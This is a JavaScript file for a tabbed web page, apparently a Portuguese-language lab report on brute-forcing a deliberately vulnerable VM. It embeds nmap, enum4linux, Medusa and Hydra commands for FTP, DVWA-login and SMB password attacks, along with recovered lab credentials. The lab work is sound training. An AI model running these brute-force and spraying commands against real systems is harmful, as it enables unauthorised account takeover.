// JS - interatividade das abas e carregamento dinâmico
document.addEventListener('DOMContentLoaded', function() {
    // Conteúdos dos cenários (poderiam vir de um objeto ou JSON)
    const tabContents = {
        ftp: `
            <div class="attack-detail">
                <h3><i class="fas fa-ftp"></i> FTP (porta 21)</h3>
                <p><strong>Enumeração:</strong></p>
                <pre><code>nmap -p 21 -sV 192.168.56.101</code></pre>
                <p><strong>Ataque com Medusa:</strong></p>
                <pre><code>medusa -h 192.168.56.101 -U wordlists/users.txt -P wordlists/passwords.txt -M ftp -n 21 -f -O results/medusa_ftp.txt</code></pre>
                <p><strong>Resultado:</strong></p>
                <div class="result-box">ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]</div>
                <p><strong>Validação:</strong></p>
                <pre><code>ftp 192.168.56.101
# usuário: msfadmin
# senha: msfadmin
ftp> ls</code></pre>
            </div>
        `,
        dvwa: `
            <div class="attack-detail">
                <h3><i class="fas fa-globe"></i> DVWA (formulário web)</h3>
                <p><strong>Configuração:</strong> DVWA em <code>http://192.168.56.101/dvwa</code>, segurança definida para <strong>"low"</strong>.</p>
                <p><strong>Identificação da mensagem de falha:</strong> "Login failed" (via DevTools).</p>
                <p><strong>Tentativa com Medusa (não obteve sucesso):</strong></p>
                <pre><code>medusa -h 192.168.56.101 -U wordlists/users.txt -P wordlists/passwords.txt -M http -m PAGE:"/dvwa/login.php" -m FORM:"username=^USER^&password=^PASS^&Login=Login" -m FAIL:"Login failed" -t 6 -O results/medusa_dvwa.txt</code></pre>
                <p><strong>Observação:</strong> Medusa apresentou limitações com sessões e cookies. O ataque foi bem-sucedido com Hydra:</p>
                <pre><code>hydra -l admin -P wordlists/passwords.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V</code></pre>
                <div class="result-box">Credencial encontrada: <code>admin:password</code></div>
            </div>
        `,
        smb: `
            <div class="attack-detail">
                <h3><i class="fas fa-network-wired"></i> SMB (Password Spraying)</h3>
                <p><strong>Enumeração de usuários com enum4linux:</strong></p>
                <pre><code>enum4linux -U 192.168.56.101 | tee results/enum4linux.txt</code></pre>
                <p><strong>Wordlist de usuários criada (smb_users.txt):</strong> msfadmin, user, postgres, syslog, klog</p>
                <p><strong>Ataque com Medusa (uma senha para vários usuários):</strong></p>
                <pre><code>medusa -h 192.168.56.101 -U wordlists/smb_users.txt -p msfadmin -M smbnt -f -O results/medusa_smb.txt</code></pre>
                <p><strong>Resultado:</strong></p>
                <div class="result-box">ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]</div>
                <p><strong>Validação:</strong></p>
                <pre><code>smbclient -L //192.168.56.101 -U msfadmin%msfadmin</code></pre>
            </div>
        `
    };

    // Seleciona os botões e o container de conteúdo
    const tabButtons = document.querySelectorAll('.tab-button');
    const tabContentDiv = document.getElementById('tab-content');

    // Função para ativar uma aba
    function activateTab(tabId) {
        // Atualiza classes dos botões
        tabButtons.forEach(btn => {
            btn.classList.remove('active');
            if (btn.dataset.tab === tabId) {
                btn.classList.add('active');
            }
        });
        // Atualiza conteúdo
        tabContentDiv.innerHTML = tabContents[tabId] || '<p>Conteúdo não encontrado.</p>';
    }

    // Adiciona eventos aos botões
    tabButtons.forEach(btn => {
        btn.addEventListener('click', () => {
            activateTab(btn.dataset.tab);
        });
    });

    // Ativa a primeira aba (FTP) por padrão
    activateTab('ftp');
});